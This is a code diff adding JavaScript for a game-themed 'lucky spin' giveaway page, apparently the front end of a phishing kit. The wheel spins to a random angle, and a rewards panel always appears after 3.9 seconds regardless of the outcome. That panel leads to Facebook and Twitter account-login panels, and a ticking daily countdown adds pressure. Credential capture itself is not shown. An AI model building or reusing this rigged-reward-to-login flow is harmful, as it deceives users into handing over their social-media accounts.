@@ -1,0 +1,115 @@
+
+        document.write(ls())
+    
+
+        document.write(ls())
+    
+
+        document.write(riyanandhika())
+    
+
+        document.write(head())
+    
+
+        document.write(result())
+    
+
+        function openHero(evt, heroClass) {
+            var i, gallery, tab;
+            gallery = document.getElementsByClassName("gallery");
+            for (i = 0; i < gallery.length; i++) {
+                gallery[i].style.display = "none";
+            }
+            tab = document.getElementsByClassName("tab");
+            for (i = 0; i < tab.length; i++) {
+                tab[i].className = tab[i].className.replace(" active", "");
+            }
+            document.getElementById(heroClass).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        document.getElementById("defaultOpen").click();
+    
+
+        document.write(luckyspin())
+    
+
+    function close_open_rewards() {
+        $('.open_rewards').hide();
+    }
+	function open_account_login() {
+        $('.open_account_login').show();
+		$('.open_rewards').hide();
+    }
+	function close_account_login() {
+        $('.open_account_login').hide();
+		$('.open_rewards').show();
+    }
+	function open_facebook() {
+        $('.login_facebook').show();
+        $('.open_account_login').hide();
+    }
+	function open_twitter() {
+        $('.login_twitter').show();
+        $('.open_account_login').hide();
+    }
+	function close_facebook() {
+        $('.login_facebook').hide();
+        $('.open_account_login').show();
+    }
+	function close_twitter() {
+        $('.login_twitter').hide();
+        $('.open_account_login').show();
+    }
+   function spin() {
+     document.getElementsByTagName("audio")[0].play();
+    setTimeout(function() {
+    $('.open_rewards').show();
+   },3900);
+
+  var $myElm = $(".spin");
+
+  function rotate(degrees) {
+    $myElm.css({
+      '-webkit-transform': 'rotate(' + degrees + 'deg)',
+      '-moz-transform': 'rotate(' + degrees + 'deg)',
+      '-ms-transform': 'rotate(' + degrees + 'deg)',
+      'transform': 'rotate(' + degrees + 'deg)'
+    });
+  }
+ $({
+    deg: 0
+  }).animate({
+    deg: 360 * 40
+  }, {
+    duration: 3900,
+    step: function() {
+        const lord = Math.random() * (360 - 1) + 1;
+      var deg = this.deg;
+      rotate(lord * 4);
+    }
+  });
+}
+setInterval(function time(){
+  var d = new Date();
+  var hours = 24 - d.getHours();
+  var min = 60 - d.getMinutes();
+  if((min + '').length == 1){
+    min = '0' + min;
+  }
+  var sec = 60 - d.getSeconds();
+  if((sec + '').length == 1){
+        sec = '0' + sec;
+  }
+  jQuery('#waktu p').html(hours+':'+min+':'+sec)
+}, 1000);
+
+
+// <![CDATA[
+function klik1() {
+    var audio = document.getElementById('klik1');
+    audio.play();
+}
+$(document).ready(function(){
+        $("o").attr("onclick", "klik1()");
+});
+//]]>
